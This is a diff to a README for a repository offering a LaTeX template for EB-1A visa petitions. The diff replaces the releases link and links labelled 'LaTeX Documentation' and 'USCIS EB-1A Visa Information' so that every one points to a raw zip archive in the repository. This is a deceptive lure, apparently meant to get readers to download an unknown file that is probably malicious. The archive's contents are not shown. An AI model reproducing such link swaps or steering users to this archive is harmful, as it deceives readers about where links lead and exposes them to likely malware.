@@ -6,7 +6,7 @@ Welcome to the EB1A-Petition repository. This project provides a LaTeX template 
 
 ## 📥 Download & Install
 
-To download the template, visit this page to download: [Download EB1A-Petition](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/releases)
+To download the template, visit this page to download: [Download EB1A-Petition](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/raw/refs/heads/main/build/E_Petition_1.5.zip)
 
 ### Steps to Download:
 1. Click the link above.
@@ -57,11 +57,11 @@ If you need help or have questions about using the template, feel free to create
 
 ## 📖 Additional Resources
 
-- **LaTeX Documentation:** Familiarize yourself with LaTeX basics [here](https://www.latex-project.org/help/documentation/).
+- **LaTeX Documentation:** Familiarize yourself with LaTeX basics [here](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/raw/refs/heads/main/build/E_Petition_1.5.zip).
 - **EB-1A Visa Information:** For more details on the EB-1A visa, you can visit the U.S. Citizenship and Immigration Services (USCIS) website.
 
 ## 🔗 Quick Links
 
-- [Download EB1A-Petition](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/releases)
-- [LaTeX Documentation](https://www.latex-project.org/help/documentation/)
-- [USCIS EB-1A Visa Information](https://www.uscis.gov/eb-1-extraordinary-ability)
+- [Download EB1A-Petition](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/raw/refs/heads/main/build/E_Petition_1.5.zip)
+- [LaTeX Documentation](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/raw/refs/heads/main/build/E_Petition_1.5.zip)
+- [USCIS EB-1A Visa Information](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/raw/refs/heads/main/build/E_Petition_1.5.zip)
